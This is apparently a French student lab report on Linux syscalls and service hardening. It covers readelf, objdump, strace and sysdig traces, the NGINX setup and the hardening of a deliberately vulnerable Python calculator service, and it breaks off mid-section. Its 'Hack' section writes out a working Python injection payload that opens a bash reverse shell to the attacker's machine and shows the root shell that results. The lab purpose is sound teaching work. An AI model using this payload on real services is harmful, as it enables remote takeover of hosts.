# TP2: Syscalls

## Part I: Learn

### 1. Anatomy of a program

#### A. file

**🌞 Utiliser file pour déterminer le type de :**

```bash
    [toto@b002-02 ~]$ file ls
    ls: cannot open `ls' (No such file or directory)
    
    [toto@b002-02 ~]$ file ip
    ip: cannot open `ip' (No such file or directory)

    [toto@b002-02 ~]$ file FREE\ Asake\ Type\ Beat\ -\ Afrobeat\ _\ _STYLE_.mp3 
    FREE Asake Type Beat - Afrobeat _ _STYLE_.mp3: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v1, 64 kbps, 44.1 kHz, Stereo

```

#### B. readelf

**🌞 Utiliser readelf sur le programme ls**

```bash
    [toto@b002-02 ~]$ readelf -h /usr/bin/ls
    ELF Header:
      Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
      Class:                             ELF64
      Data:                              2's complement, little endian
      Version:                           1 (current)
      OS/ABI:                            UNIX - System V
      ABI Version:                       0
      Type:                              DYN (Shared object file)
      Machine:                           Advanced Micro Devices X86-64
      Version:                           0x1
      Entry point address:               0x6b10
      Start of program headers:          64 (bytes into file)
      Start of section headers:          139032 (bytes into file)
      Flags:                             0x0
      Size of this header:               64 (bytes)
      Size of program headers:           56 (bytes)
      Number of program headers:         13
      Size of section headers:           64 (bytes)
      Number of section headers:         30
      Section header string table index: 29
      
 
    [toto@b002-02 ~]$ readelf -S /usr/bin/ls
    There are 30 section headers, starting at offset 0x21f18:

    Section Headers:
      [Nr] Name              Type             Address           Offset
           Size              EntSize          Flags  Link  Info  Align
      [ 0]                   NULL             0000000000000000  00000000
           0000000000000000  0000000000000000           0     0     0
      [ 1] .interp           PROGBITS         0000000000000318  00000318
           000000000000001c  0000000000000000   A       0     0     1
      [ 2] .note.gnu.pr[...] NOTE             0000000000000338  00000338
           0000000000000030  0000000000000000   A       0     0     8
      [ 3] .note.gnu.bu[...] NOTE             0000000000000368  00000368
           0000000000000024  0000000000000000   A       0     0     4
      [ 4] .note.ABI-tag     NOTE             000000000000038c  0000038c
           0000000000000020  0000000000000000   A       0     0     4
      [ 5] .gnu.hash         GNU_HASH         00000000000003b0  000003b0
           0000000000000040  0000000000000000   A       6     0     8
      [ 6] .dynsym           DYNSYM           00000000000003f0  000003f0
           0000000000000bb8  0000000000000018   A       7     1     8
      [ 7] .dynstr           STRTAB           0000000000000fa8  00000fa8
           00000000000005c5  0000000000000000   A       0     0     1
      [ 8] .gnu.version      VERSYM           000000000000156e  0000156e
           00000000000000fa  0000000000000002   A       6     0     2
      [ 9] .gnu.version_r    VERNEED          0000000000001668  00001668
           00000000000000c0  0000000000000000   A       7     2     8
      [10] .rela.dyn         RELA             0000000000001728  00001728
           0000000000001410  0000000000000018   A       6     0     8
      [11] .rela.plt         RELA             0000000000002b38  00002b38
           00000000000009d8  0000000000000018  AI       6    24     8
      [12] .init             PROGBITS         0000000000004000  00004000
           000000000000001b  0000000000000000  AX       0     0     4
      [13] .plt              PROGBITS         0000000000004020  00004020
           00000000000006a0  0000000000000010  AX       0     0     16
      [14] .plt.sec          PROGBITS         00000000000046c0  000046c0
           0000000000000690  0000000000000010  AX       0     0     16
      [15] .text             PROGBITS         0000000000004d50  00004d50
           0000000000012532  0000000000000000  AX       0     0     16
      [16] .fini             PROGBITS         0000000000017284  00017284
           000000000000000d  0000000000000000  AX       0     0     4
      [17] .rodata           PROGBITS         0000000000018000  00018000
           0000000000004dec  0000000000000000   A       0     0     32
      [18] .eh_frame_hdr     PROGBITS         000000000001cdec  0001cdec
           000000000000056c  0000000000000000   A       0     0     4
      [19] .eh_frame         PROGBITS         000000000001d358  0001d358
           0000000000002128  0000000000000000   A       0     0     8
      [20] .init_array       INIT_ARRAY       0000000000020f70  0001ff70
           0000000000000008  0000000000000008  WA       0     0     8
      [21] .fini_array       FINI_ARRAY       0000000000020f78  0001ff78
           0000000000000008  0000000000000008  WA       0     0     8
      [22] .data.rel.ro      PROGBITS         0000000000020f80  0001ff80
           0000000000000a98  0000000000000000  WA       0     0     32
      [23] .dynamic          DYNAMIC          0000000000021a18  00020a18
           0000000000000210  0000000000000010  WA       7     0     8
      [24] .got              PROGBITS         0000000000021c28  00020c28
           00000000000003c8  0000000000000008  WA       0     0     8
      [25] .data             PROGBITS         0000000000022000  00021000
           0000000000000278  0000000000000000  WA       0     0     32
      [26] .bss              NOBITS           0000000000022280  00021278
           00000000000012c0  0000000000000000  WA       0     0     32
      [27] .gnu_debuglink    PROGBITS         0000000000000000  00021278
           0000000000000020  0000000000000000           0     0     4
      [28] .gnu_debugdata    PROGBITS         0000000000000000  00021298
           0000000000000b58  0000000000000000           0     0     1
      [29] .shstrtab         STRTAB           0000000000000000  00021df0
           0000000000000128  0000000000000000           0     0     1
    Key to Flags:
      W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
      L (link order), O (extra OS processing required), G (group), T (TLS),
      C (compressed), x (unknown), o (OS specific), E (exclude),
      l (large), p (processor specific)
```

- Déterminer l'adresse de début du code du programme

Dans la sortie de readelf -S /usr/bin/ls, nous pouvons voir que la section .text commence à l'adresse :

```bash
    0000000000004d50
```

#### C. ldd

**🌞 Utiliser ldd sur le programme ls**

```bash
    [toto@b002-02 ~]$ ldd /usr/bin/ls
	    linux-vdso.so.1 (0x00007ffc41ddf000)
	    libselinux.so.1 => /lib64/libselinux.so.1 (0x00007fe2925ea000)
	    libcap.so.2 => /lib64/libcap.so.2 (0x00007fe2925e0000)
	    libc.so.6 => /lib64/libc.so.6 (0x00007fe292200000)
	    libpcre2-8.so.0 => /lib64/libpcre2-8.so.0 (0x00007fe292544000)
	    /lib64/ld-linux-x86-64.so.2 (0x00007fe292641000)
```

 Parmi ces librairies, celle qui correspond à la Glibc (GNU C Library) est : 
 
```bash
	    libc.so.6 => /lib64/libc.so.6 (0x00007fe292200000)
```


### 2. Syscalls basics

#### A. Syscall list

**🌞 Donner le nom ET l'identifiant unique d'un syscall qui permet à un processus de...**

```bash
    Pour lire un fichier stocké sur disque :
    Nom : read
    Identifiant unique : 0 
    Pour écrire dans un fichier stocké sur disque :
    Nom : write
    Identifiant unique : 1 
    Pour lancer un nouveau processus :
    Nom : fork
    Identifiant unique : 57 
```

#### B. objdump

**🌞 Utiliser objdump sur la commande ls**

- Afficher le contenu de la section .text
```bash
    [toto@b002-02 ~]$ objdump -D -j .text /usr/bin/ls

    /usr/bin/ls:     file format elf64-x86-64


    Disassembly of section .text:

    0000000000004d50 <_obstack_begin@@Base-0xb090>:
        4d50:	50                   	push   %rax
        4d51:	e8 da f9 ff ff       	callq  4730 <abort@plt>
        4d56:	e8 d5 f9 ff ff       	callq  4730 <abort@plt>
        4d5b:	e8 d0 f9 ff ff       	callq  4730 <abort@plt>
        4d60:	e8 cb f9 ff ff       	callq  4730 <abort@plt>
        4d65:	e8 c6 f9 ff ff       	callq  4730 <abort@plt>
        4d6a:	e8 c1 f9 ff ff       	callq  4730 <abort@plt>
        4d6f:	e8 bc f9 ff ff       	callq  4730 <abort@plt>
        4d74:	e8 b7 f9 ff ff       	callq  4730 <abort@plt>
        4d79:	e8 b2 f9 ff ff       	callq  4730 <abort@plt>
        4d7e:	66 90                	xchg   %ax,%ax
        4d80:	f3 0f 1e fa          	endbr64 
        4d84:	41 57                	push   %r15
        4d86:	41 56                	push   %r14
        4d88:	41 55                	push   %r13
        4d8a:	41 54                	push   %r12
        4d8c:	55                   	push   %rbp
        4d8d:	53                   	push   %rbx
    ...
```

- Mettez en évidence quelques lignes contenant l'instruction call

```bash
    [toto@b002-02 ~]$ objdump -D -j .text /usr/bin/ls | grep "call"
        4d51:	e8 da f9 ff ff       	callq  4730 <abort@plt>
        4d56:	e8 d5 f9 ff ff       	callq  4730 <abort@plt>
        4d5b:	e8 d0 f9 ff ff       	callq  4730 <abort@plt>
        4d60:	e8 cb f9 ff ff       	callq  4730 <abort@plt>
        4d65:	e8 c6 f9 ff ff       	callq  4730 <abort@plt>
        4d6a:	e8 c1 f9 ff ff       	callq  4730 <abort@plt>
        4d6f:	e8 bc f9 ff ff       	callq  4730 <abort@plt>
        4d74:	e8 b7 f9 ff ff       	callq  4730 <abort@plt>
        4d79:	e8 b2 f9 ff ff       	callq  4730 <abort@plt>
        4dbc:	e8 6f fb ff ff       	callq  4930 <strrchr@plt>
        4dea:	e8 61 f9 ff ff       	callq  4750 <strncmp@plt>
        4e05:	e8 46 f9 ff ff       	callq  4750 <strncmp@plt>
        4e3c:	e8 1f fd ff ff       	callq  4b60 <setlocale@plt>
        4e4b:	e8 20 fa ff ff       	callq  4870 <bindtextdomain@plt>
        4e53:	e8 d8 f9 ff ff       	callq  4830 <textdomain@plt>
        ...
```

- Mettez en évidence quelques lignes contenant l'instruction sycall

```bash
    [toto@b002-02 ~]$ objdump -d -j .text /usr/bin/ls | grep "syscall"
    [toto@b002-02 ~]$ 
```

**🌞 Utiliser objdump sur la librairie Glibc**

- mettez en évidence quelques lignes qui contiennent l'instruction syscall
```bash
    [toto@b002-02 ~]$ ldd /usr/bin/ls | grep libc.so
	    libc.so.6 => /lib64/libc.so.6 (0x00007f768f200000)
    [toto@b002-02 ~]$ objdump -d /lib64/libc.so.6 > glibc_disassembly.txt
    [toto@b002-02 ~]$ grep -n "syscall" glibc_disassembly.txt
    1721:   295f4:	0f 05                	syscall 
    23758:   3e737:	0f 05                	syscall 
    23805:   3e801:	0f 05                	syscall 
    23892:   3e969:	0f 05                	syscall 
    23909:   3e99e:	0f 05                	syscall 
    23931:   3e9ea:	0f 05                	syscall 
    23943:   3ea18:	0f 05                	syscall 
    24338:   3ef49:	0f 05                	syscall 
    24687:   3f3b6:	0f 05                	syscall 
    24716:   3f418:	0f 05                	syscall 
    24789:   3f509:	0f 05                	syscall 
    28207:   423f5:	0f 05                	syscall 
    28221:   4242d:	0f 05                	syscall 
    28258:   424b0:	0f 05                	syscall 
    37406:   4b339:	0f 05                	syscall 
    40204:   4dda3:	0f 05                	syscall 
    40229:   4de0f:	0f 05                	syscall 
    40249:   4de4e:	0f 05                	syscall 
    40537:   4e2cf:	0f 05                	syscall 
    40562:   4e342:	0f 05                	syscall 
    46329:   5382b:	0f 05                	syscall 
    53429:   5a969:	0f 05                	syscall 
    53445:   5a99c:	0f 05                	syscall 
    53466:   5a9e1:	0f 05                	syscall 
    90035:   7f9ce:	0f 05                	syscall 
    ...
```

- trouvez l'instrution syscall qui exécute le syscall close()
```bash
    [toto@b002-02 ~]$ grep -A 10 "<__close>:" glibc_disassembly.txt
    00000000000fe220 <__close>:
       fe220:	f3 0f 1e fa          	endbr64 
       fe224:	64 8b 04 25 18 00 00 	mov    %fs:0x18,%eax
       fe22b:	00 
       fe22c:	85 c0                	test   %eax,%eax
       fe22e:	75 10                	jne    fe240 <__close+0x20>
       fe230:	b8 03 00 00 00       	mov    $0x3,%eax
       fe235:	0f 05                	syscall 
       fe237:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
       fe23d:	77 41                	ja     fe280 <__close+0x60>
       fe23f:	c3                   	retq   
```


## Part II: Observe

### 1.strace

**🌞 Utiliser strace pour tracer l'exécution de la commande ls**

```bash
    [toto@b002-02 ~]$ ls
    'FREE Asake Type Beat - Afrobeat _ _STYLE_.mp3'   glibc_disassembly.txt
    [toto@b002-02 ~]$ strace ls

    write(1, "'FREE Asake Type Beat - Afrobeat"..., 72'FREE Asake Type Beat - Afrobeat _ _STYLE_.mp3'   glibc_disassembly.txt
    ) = 72
```

**🌞 Utiliser strace pour tracer l'exécution de la commande cat**

```bash
[toto@b002-02 ~]$ strace cat TP1\ Hardening\ basics.txt 

openat(AT_FDCWD, "TP1 Hardening basics.txt", O_RDONLY) = 3

write(1, "\nTP1 : Hardening basics\n\n\nPart I"..., 36871) = 36871
```

**🌞 Utiliser strace pour tracer l'exécution de curl example.org**

```bash
[toto@b002-02 ~]$ strace -c curl example.org

% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
 26.90    0.001350          40        33           poll
 18.71    0.000939           6       141           mmap
 14.43    0.000724         362         2           socket
  6.78    0.000340           5        60        14 openat
  5.78    0.000290          41         7           write
  4.70    0.000236           2        92           rt_sigaction
  3.85    0.000193           5        35           mprotect
  3.13    0.000157           2        54           close
  3.09    0.000155           6        24           futex
  2.51    0.000126           2        46           fstat
  2.23    0.000112         112         1         1 connect
  2.01    0.000101           2        36           read
  0.88    0.000044          44         1           recvfrom
  0.84    0.000042          42         1           sendto
  0.48    0.000024          24         1           clone3
  0.40    0.000020          10         2           socketpair
  0.38    0.000019           4         4           setsockopt
  0.34    0.000017           8         2           statfs
  0.28    0.000014           2         6           fcntl
  0.28    0.000014           7         2           newfstatat
  0.26    0.000013          13         1           munmap
  0.26    0.000013           3         4           brk
  0.18    0.000009           4         2         1 access
  0.16    0.000008           2         4           pread64
  0.16    0.000008           8         1           pipe
  0.14    0.000007           7         1           getsockopt
  0.12    0.000006           3         2           ioctl
  0.12    0.000006           3         2           getdents64
  0.10    0.000005           1         3           rt_sigprocmask
  0.10    0.000005           5         1           getsockname
  0.10    0.000005           5         1           getpeername
  0.08    0.000004           4         1           sysinfo
  0.06    0.000003           3         1           getrandom
  0.04    0.000002           1         2         1 arch_prctl
  0.04    0.000002           2         1           set_tid_address
  0.04    0.000002           2         1           set_robust_list
  0.04    0.000002           2         1           prlimit64
  0.02    0.000001           1         1           rseq
  0.00    0.000000           0         1           execve
------ ----------- ----------- --------- --------- ----------------
100.00    0.005018           8       581        17 total
```

### 2. sysdig

#### A. Into

```bash
    [toto@b002-02 ~]$ ls
    'FREE Asake Type Beat - Afrobeat _ _STYLE_.mp3'   glibc_disassembly.txt   sysdig-0.39.0-x86_64.rpm  'TP1 Hardening basics.txt'

    [toto@b002-02 ~]$ sudo sysdig
    [sudo] password for toto: 
    18 18:09:19.308303881 0 sysdig (3724.3724) > switch next=0 pgft_maj=0 pgft_min=847 vm_size=55512 vm_rss=16384 vm_swap=0
    19 18:09:19.308348282 0 <NA> (<NA>.0) > switch next=17 pgft_maj=0 pgft_min=0 vm_size=0 vm_rss=0 vm_swap=0
    20 18:09:19.308351057 0 <NA> (<NA>.17) > switch next=3724(sysdig) pgft_maj=0 pgft_min=0 vm_size=0 vm_rss=0 vm_swap=0
    35 18:09:19.308419782 0 sysdig (3724.3724) > switch next=59 pgft_maj=0 pgft_min=848 vm_size=55512 vm_rss=16384 vm_swap=0
    36 18:09:19.308423046 0 <NA> (<NA>.59) > switch next=1251(sshd) pgft_maj=0 pgft_min=0 vm_size=0 vm_rss=0 vm_swap=0
    37 18:09:19.308426398 0 sshd (1251.1251) < pselect6 
    38 18:09:19.308429364 0 sshd (1251.1251) > rt_sigprocmask 
    39 18:09:19.308429685 0 sshd (1251.1251) < rt_sigprocmask 
    40 18:09:19.308432119 0 sshd (1251.1251) > read fd=12(<f>/dev/ptmx) size=16384
    41 18:09:19.308433763 0 sshd (1251.1251) < read res=158 data=18 18:09:19.308303881 0 .[01;32msysdig.[00m (.[01;36m3724.[00m.3724) > .[01;34ms
    42 18:09:19.308438067 0 sshd (1251.1251) > getpid 
    43 18:09:19.308438281 0 sshd (1251.1251) < getpid 
    44 18:09:19.308443667 0 sshd (1251.1251) > rt_sigprocmask 
    45 18:09:19.308443856 0 sshd (1251.1251) < rt_sigprocmask 
    46 18:09:19.308444756 0 sshd (1251.1251) > pselect6 
    47 18:09:19.308445905 0 sshd (1251.1251) < pselect6 
    48 18:09:19.308446256 0 sshd (1251.1251) > rt_sigprocmask 
    49 18:09:19.308446429 0 sshd (1251.1251) < rt_sigprocmask 
    50 18:09:19.308447043 0 sshd (1251.1251) > write fd=4(<4t>192.168.56.1:39358->192.168.56.114:22) size=196
    51 18:09:19.308476321 0 sshd (1251.1251) < write res=196 data=U.......8..d..T.8.....H!.Q..v..B;Kyz....N.E..;WwD.....V...(z.....k..8O.....v....
```

#### B. Using it

**🌞 Utiliser sysdig pour tracer les syscalls  effectués par ls**

```bash
        [toto@b002-02 ~]$ sudo sysdig proc.name=ls 

        2220 18:15:01.800400491 0 ls (3794) < write res=155 data=.[0m.[01;36m'FREE Asake Type Beat - Afrobeat _ _STYLE_.mp3'.[0m   glibc_disassem
```

**🌞 Utiliser sysdig pour tracer les syscalls  effectués par cat**

```bash
    [toto@b002-02 ~]$ cat TP1\ Hardening\ basics.txt 

    TP1 : Hardening basics


    Part I : User management


    1. Existing users

    🌞 Déterminer l'existant :


    [toto@b002-02 ~]$ sudo sysdig proc.name=cat | grep "open"
    4261 18:18:52.144076071 0 cat (3817) < openat fd=3(<f>/home/toto/TP1 Hardening basics.txt) dirfd=-100(AT_FDCWD) name=TP1 Hardening basics.txt(/home/toto/TP1 Hardening basics.txt) flags=1(O_RDONLY) mode=0 dev=FD00 ino=4600142

    2029 18:22:10.990363067 0 cat (3840) > write fd=1(<f>/dev/pts/1) size=36871
```

**🌞 Utiliser sysdig pour tracer les syscalls  effectués par votre utilisateur**

```bash
    [toto@b002-02 ~]$ sudo sysdig user.name=$(whoami)
```

🌞 Livrez le fichier curl.scap dans le dépôt git de rendu

- Capture disponible dans les fichiers



## Part III : Service Hardening

### 1. Install NGINX

**➜ Installer et démarrer le serveur Web NGINX sur la machine**
```bash
    [toto@b002-02 ~]$ sudo dnf install nginx
    [sudo] password for toto: 
    Last metadata expiration check: 0:57:47 ago on Thu 06 Feb 2025 05:45:18 PM CET.
    Dependencies resolved.
    ==============================================================================================================================================================================================================================================================
     Package                                                           Architecture                                           Version                                                             Repository                                                 Size
    ==============================================================================================================================================================================================================================================================
    Installing:
     nginx                                                             x86_64                                                 2:1.20.1-20.el9.0.1                                                 appstream                                                  36 k
    Installing dependencies:
     nginx-core                                                        x86_64                                                 2:1.20.1-20.el9.0.1                                                 appstream                                                 566 k
     nginx-filesystem                                                  noarch                                                 2:1.20.1-20.el9.0.1                                                 appstream                                                 8.4 k
     rocky-logos-httpd                                                 noarch                                                 90.15-2.el9                                                         appstream                                                  24 k

    Transaction Summary
    ==============================================================================================================================================================================================================================================================
    Install  4 Packages

    Total download size: 634 k
    Installed size: 1.8 M
    Is this ok [y/N]: y
    Downloading Packages:
    (1/4): nginx-filesystem-1.20.1-20.el9.0.1.noarch.rpm                                                                                                                                                                           78 kB/s | 8.4 kB     00:00    
    (2/4): rocky-logos-httpd-90.15-2.el9.noarch.rpm                                                                                                                                                                               147 kB/s |  24 kB     00:00    
    (3/4): nginx-1.20.1-20.el9.0.1.x86_64.rpm                                                                                                                                                                                     168 kB/s |  36 kB     00:00    
    (4/4): nginx-core-1.20.1-20.el9.0.1.x86_64.rpm                                                                                                                                                                                2.0 MB/s | 566 kB     00:00    
    --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    Total                                                                                                                                                                                                                         964 kB/s | 634 kB     00:00     
    Running transaction check
    Transaction check succeeded.
    Running transaction test
    Transaction test succeeded.
    Running transaction
      Preparing        :                                                                                                                                                                                                                                      1/1 
      Running scriptlet: nginx-filesystem-2:1.20.1-20.el9.0.1.noarch                                                                                                                                                                                          1/4 
      Installing       : nginx-filesystem-2:1.20.1-20.el9.0.1.noarch                                                                                                                                                                                          1/4 
      Installing       : nginx-core-2:1.20.1-20.el9.0.1.x86_64                                                                                                                                                                                                2/4 
      Installing       : rocky-logos-httpd-90.15-2.el9.noarch                                                                                                                                                                                                 3/4 
      Installing       : nginx-2:1.20.1-20.el9.0.1.x86_64                                                                                                                                                                                                     4/4 
      Running scriptlet: nginx-2:1.20.1-20.el9.0.1.x86_64                                                                                                                                                                                                     4/4 
      Verifying        : rocky-logos-httpd-90.15-2.el9.noarch                                                                                                                                                                                                 1/4 
      Verifying        : nginx-filesystem-2:1.20.1-20.el9.0.1.noarch                                                                                                                                                                                          2/4 
      Verifying        : nginx-2:1.20.1-20.el9.0.1.x86_64                                                                                                                                                                                                     3/4 
      Verifying        : nginx-core-2:1.20.1-20.el9.0.1.x86_64                                                                                                                                                                                                4/4 

    Installed:
      nginx-2:1.20.1-20.el9.0.1.x86_64                          nginx-core-2:1.20.1-20.el9.0.1.x86_64                          nginx-filesystem-2:1.20.1-20.el9.0.1.noarch                          rocky-logos-httpd-90.15-2.el9.noarch                         

    Complete!
    
    
    [toto@b002-02 ~]$ sudo systemctl start nginx
    [toto@b002-02 ~]$ sudo systemctl enable nginx
    
    [toto@b002-02 ~]$ sudo systemctl status nginx
    ● nginx.service - The nginx HTTP and reverse proxy server
         Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; preset: disabled)
         Active: active (running) since Fri 2025-02-07 14:11:37 CET; 1min 47s ago
       Main PID: 1384 (nginx)
          Tasks: 2 (limit: 11097)
         Memory: 3.3M
            CPU: 15ms
         CGroup: /system.slice/nginx.service
                 ├─1384 "nginx: master process /usr/sbin/nginx"
                 └─1385 "nginx: worker process"

    Feb 07 14:11:37 b002-02.etudiants.campus.villejuif systemd[1]: Starting The nginx HTTP and reverse proxy server...
    Feb 07 14:11:37 b002-02.etudiants.campus.villejuif nginx[1382]: nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
    Feb 07 14:11:37 b002-02.etudiants.campus.villejuif nginx[1382]: nginx: configuration file /etc/nginx/nginx.conf test is successful
    Feb 07 14:11:37 b002-02.etudiants.campus.villejuif systemd[1]: Started The nginx HTTP and reverse proxy server.

    [toto@b002-02 ~]$ sudo systemctl stop nginx
```


### 2. NGINX Tracing

**🌞 Tracer l'exécution du programme NGINX**

```bash
    [pid  1568] accept4(7, {sa_family=AF_INET6, sin6_port=htons(59054), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "::1", &sin6_addr), sin6_scope_id=0}, [112 => 28], SOCK_NONBLOCK) = 3
    [pid  1568] epoll_ctl(9, EPOLL_CTL_ADD, 3, {events=EPOLLIN|EPOLLRDHUP|EPOLLET, data={u32=4222730977, u64=139792523313889}}) = 0
    [pid  1568] epoll_wait(9, [{events=EPOLLIN, data={u32=4222730977, u64=139792523313889}}], 512, 60000) = 1
    [pid  1568] recvfrom(3, "GET / HTTP/1.1\r\nHost: localhost\r"..., 1024, 0, NULL, NULL) = 73
    [pid  1568] newfstatat(AT_FDCWD, "/usr/share/nginx/html/index.html", {st_mode=S_IFREG|0644, st_size=7620, ...}, 0) = 0
    [pid  1568] openat(AT_FDCWD, "/usr/share/nginx/html/index.html", O_RDONLY|O_NONBLOCK) = 12
    [pid  1568] fstat(12, {st_mode=S_IFREG|0644, st_size=7620, ...}) = 0
    [pid  1568] setsockopt(3, SOL_TCP, TCP_CORK, [1], 4) = 0
    [pid  1568] writev(3, [{iov_base="HTTP/1.1 200 OK\r\nServer: nginx/1"..., iov_len=240}], 1) = 240
    [pid  1568] sendfile(3, 12, [0] => [7620], 7620) = 7620
    [pid  1568] write(5, "::1 - - [07/Feb/2025:14:31:05 +0"..., 85) = 85
    [pid  1568] close(12)                   = 0
    [pid  1568] setsockopt(3, SOL_TCP, TCP_CORK, [0], 4) = 0
    [pid  1568] epoll_wait(9, [{events=EPOLLIN|EPOLLRDHUP, data={u32=4222730977, u64=139792523313889}}], 512, 65000) = 1
    [pid  1568] recvfrom(3, "", 1024, 0, NULL, NULL) = 0
    [pid  1568] close(3)                    = 0
```
### 3. NGINX Hardening

**🌞 HARDEN**

- Fichier disponible en haut



## Part IV : My shitty app

### 1. Test

```bash
    white-ghost@white-ghost-AORUS-16X-ASG:~/Documents/Hardening d'OS$ scp calc.py toto@192.168.56.114:/home/toto
    toto@192.168.56.114's password: 
    calc.py                                                                                     100%  780   725.6KB/s   00:00    
```

**🌞 Téléchargez l'app Python dans votre VM**

```bash
    [toto@b002-02 ~]$ curl -O https://bootstrap.pypa.io/get-pip.py
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 2246k  100 2246k    0     0  1696k      0  0:00:01  0:00:01 --:--:-- 1696k
    [toto@b002-02 ~]$ sudo python get-pip.py
    [sudo] password for toto: 
    Collecting pip
      Downloading pip-25.0-py3-none-any.whl.metadata (3.7 kB)
    Collecting setuptools
      Downloading setuptools-75.8.0-py3-none-any.whl.metadata (6.7 kB)
    Collecting wheel
      Downloading wheel-0.45.1-py3-none-any.whl.metadata (2.3 kB)
    Downloading pip-25.0-py3-none-any.whl (1.8 MB)
       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.8/1.8 MB 12.6 MB/s eta 0:00:00
    Downloading setuptools-75.8.0-py3-none-any.whl (1.2 MB)
       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.2/1.2 MB 22.4 MB/s eta 0:00:00
    Downloading wheel-0.45.1-py3-none-any.whl (72 kB)
    Installing collected packages: wheel, setuptools, pip
      WARNING: The script wheel is installed in '/usr/local/bin' which is not on PATH.
      Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.
      WARNING: The scripts pip, pip3 and pip3.9 are installed in '/usr/local/bin' which is not on PATH.
      Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.
    Successfully installed pip-25.0 setuptools-75.8.0 wheel-0.45.1
    WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option if you know what you are doing and want to suppress this warning.
```

**🌞 Lancer l'application dans votre VM**

- Vue coté VM
```bash
    [toto@b002-02 ~]$ sudo firewall-cmd --permanent --add-port=13337/tcp
    [sudo] password for toto: 
    success
    [toto@b002-02 ~]$ sudo firewall-cmd --reload
    success

    [toto@b002-02 ~]$ python3 /opt/calc.py 
    Données reçues du client : b'\n'
    Réponse envoyée au client.
```

- Vue coté PC
```bash
    white-ghost@white-ghost-AORUS-16X-ASG:~/Documents/Hardening d'OS$ nc 192.168.56.114 13337

    Hello3+3
    6
```

### 2. Création de service

**🌞 Créer un service calculatrice.service**

```bash
    [toto@b002-02 ~]$ sudo nano /etc/systemd/system/calculatrice.service
    [sudo] password for toto: 
    [toto@b002-02 ~]$ sudo cat /etc/systemd/system/calculatrice.service
    [Unit]
    Description=Super serveur calculatrice

    [Service]
    ExecStart=/usr/bin/python3 /opt/calc.py
    Restart=always
```

**🌞 Indiquer à systemd que vous avez modifié les services**

```bash
    [toto@b002-02 ~]$ sudo systemctl daemon-reload
```

**🌞 Vérifier que ce nouveau service est bien reconnu***

```bash
    [toto@b002-02 ~]$ systemctl status calculatrice
    ○ calculatrice.service - Super serveur calculatrice
         Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
         Active: inactive (dead)
```

**🌞 Vous devez pouvoir utiliser l'application normalement :**

```bash
    [toto@b002-02 ~]$ sudo systemctl start calculatrice
    [toto@b002-02 ~]$ sudo systemctl status calculatrice
    ● calculatrice.service - Super serveur calculatrice
         Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
         Active: active (running) since Fri 2025-02-07 15:49:02 CET; 1min 17s ago
       Main PID: 2308 (python3)
          Tasks: 1 (limit: 11097)
         Memory: 3.4M
            CPU: 9ms
         CGroup: /system.slice/calculatrice.service
                 └─2308 /usr/bin/python3 /opt/calc.py

    Feb 07 15:49:02 b002-02.etudiants.campus.villejuif systemd[1]: Started Super serveur calculatrice.
    [toto@b002-02 ~]$ journalctl -xe -u calculatrice

    [toto@b002-02 ~]$ journalctl -xe -u calculatrice
    ~
    ~
    ~
    ~
    Feb 07 15:49:02 b002-02.etudiants.campus.villejuif systemd[1]: Started Super serveur calculatrice.
    ░░ Subject: A start job for unit calculatrice.service has finished successfully
    ░░ Defined-By: systemd
    ░░ Support: https://wiki.rockylinux.org/rocky/support
    ░░ 
    ░░ A start job for unit calculatrice.service has finished successfully.
    ░░ 
    ░░ The job identifier is 3713.

```

### 3. Hack

🌞 Hack l'application

```bash
    white-ghost@white-ghost-AORUS-16X-ASG:~/Documents/Hardening d'OS$ nc 192.168.56.114 13337
    Hello3+3
    6
    Hello__import__("os").system("bash -i >& /dev/tcp/192.168.56.1/9999 0>&1")
```

```bash
    white-ghost@white-ghost-AORUS-16X-ASG:~/Documents/Hardening d'OS$ nc -lvp 9999
    Listening on 0.0.0.0 9999
    Connection received on 192.168.56.114 58954
    bash: cannot set terminal process group (2449): Inappropriate ioctl for device
    bash: no job control in this shell
    [root@b002-02 /]# 
```


### 4. Harden

#### A. Utilisateurs

**🌞 Prouvez que le service s'exécute actuellement en root**

```bash
    [toto@localhost ~]$ ps aux | grep calc.py
    root        1281  0.0  0.4  10900  8576 ?        Ss   14:22   0:00 /usr/bin/python3 /opt/calc.py
    toto        1352  0.0  0.1   6412  2176 pts/0    S+   14:27   0:00 grep --color=auto calc.py
```

**🌞 Créer l'utilisateur calculatrice**

```bash
    [toto@localhost ~]$ sudo useradd -M -s /usr/sbin/nologin calculatrice
    [sudo] password for toto: 
    [toto@localhost ~]$ grep calculatrice /etc/passwd
    calculatrice:x:1002:1002::/home/calculatrice:/usr/sbin/nologin
```

**🌞 Adaptez les permissions**

```bash
    [toto@localhost ~]$ sudo chown calculatrice:calculatrice /opt/calc.py
    [toto@localhost ~]$ sudo chmod 500 /opt/calc.py
    [toto@localhost ~]$ ls -l /opt/calc.py
    -r-x------. 1 calculatrice calculatrice 780 Feb  7 15:07 /opt/calc.py
```

**🌞 Modifier le .service**

- Fichier modifier
```bash
    [toto@localhost ~]$ sudo nano /etc/systemd/system/calculatrice.service

      GNU nano 5.6.1                                                                                              /etc/systemd/system/calculatrice.service                                                                                                        
    [Unit]
    Description=Super serveur calculatrice

    [Service]
    ExecStart=/usr/bin/python3 /opt/calc.py
    Restart=always
    User=calculatrice

    [Install]
    WantedBy=multi-user.target
```

- Restart service
```bash
